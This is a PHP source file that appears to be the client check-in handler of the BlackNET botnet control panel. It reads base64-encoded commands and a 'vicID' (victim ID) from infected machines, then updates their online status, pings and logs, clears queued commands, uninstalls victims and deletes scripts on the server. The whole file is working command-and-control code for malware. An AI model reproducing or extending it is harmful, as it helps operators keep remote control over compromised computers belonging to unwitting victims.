<?php
require_once 'config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$client = new BlackNET\Clients($database, $utils);

$Y = DATA_SPLITTER;

$command = $utils->sanitize($utils->base64DecodeUrl($_GET['command']));

$ID = $utils->sanitize($utils->base64DecodeUrl($_GET['vicID']));

$data = $client->getClient($ID);

$A = explode($Y, $utils->sanitize($command));

switch ($A[0]) {
    case "Uninstall":
        $client->removeClient($ID);
        $utils->deleteDirectory(realpath("upload/" . $ID));
        break;

    case "CleanCommands":
        $client->updateCommands($ID, $utils->base64EncodeUrl("Ping"));
        break;

    case "Offline":
        $client->updateStatus($ID, "Offline");
        break;

    case "Online":
        $client->updateStatus($ID, "Online");
        break;

    case 'Pinged':
        $client->pinged($ID, $data->pings);
        break;

    case 'DeleteScript':
        $script_name = $utils->sanitize($A[1]);
        if (strpos($script_name, '../') !== false) {
            $script_name = $utils->sanitize(trim($A[1], "../"));
        }
        unlink(realpath("scripts/" . $script_name));
        break;
    case "NewLog":
        $client->newLog($ID, $utils->sanitize($A[1]), $utils->sanitize($A[2]));
        break;
    default:
        break;
}
